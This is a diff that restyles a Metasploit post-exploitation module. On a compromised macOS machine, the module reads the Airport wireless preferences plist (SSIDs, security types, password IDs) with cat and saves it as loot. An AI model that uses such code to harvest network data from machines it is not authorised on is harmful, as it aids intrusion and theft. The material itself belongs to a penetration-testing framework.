@@ -5,25 +5,33 @@
 
 class MetasploitModule < Msf::Post
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'OS X Gather Airport Wireless Preferences',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'OS X Gather Airport Wireless Preferences',
+        'Description' => %q{
           This module will download OS X Airport Wireless preferences from the victim
-        machine.  The preferences file (which is a plist) contains information such as:
-        SSID, Channels, Security Type, Password ID, etc.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'osx' ],
-      'SessionTypes'  => [ "meterpreter", "shell" ]
-    ))
+          machine.  The preferences file (which is a plist) contains information such as:
+          SSID, Channels, Security Type, Password ID, etc.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'sinn3r'],
+        'Platform' => [ 'osx' ],
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
   end
 
   def exec(cmd)
     tries = 0
     begin
-      out = cmd_exec(cmd).chomp
+      cmd_exec(cmd).chomp
     rescue ::Timeout::Error => e
       tries += 1
       if tries < 3
@@ -39,19 +47,19 @@ class MetasploitModule < Msf::Post
     end
   end
 
-
   def get_air_preferences
-    pref = exec("cat /Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist")
+    pref = exec('cat /Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist')
     return pref =~ /No such file or directory/ ? nil : pref
   end
 
   def save(data)
     p = store_loot(
-      "apple.airport.preferences",
-      "plain/text",
+      'apple.airport.preferences',
+      'plain/text',
       session,
       data,
-      "com.apple.airport.preferences.plist")
+      'com.apple.airport.preferences.plist'
+    )
 
     print_good("#{@peer} - plist saved in #{p}")
   end
